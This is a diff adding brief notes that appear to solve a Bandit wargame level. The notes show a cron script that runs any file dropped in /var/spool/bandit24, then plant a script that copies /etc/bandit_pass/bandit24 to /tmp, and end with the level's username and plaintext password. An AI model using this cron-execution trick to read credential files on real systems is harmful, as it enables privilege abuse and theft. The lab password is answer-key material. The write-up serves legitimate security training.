@@ -1,0 +1,28 @@
+cat /etc/cron.d/cronjob_bandit24
+// * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+cat /usr/bin/cronjob_bandit24.sh 
+
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
+
+// the script seems to go to /var/spool/bandit24, checks all files and executes them & then removes them
+// so we like to run a script there which can access /etc/bandit_pass/bandit24 and show or save the password 
+// where we can read it
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/pass.txt
+ 
+username bandit24
+password UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
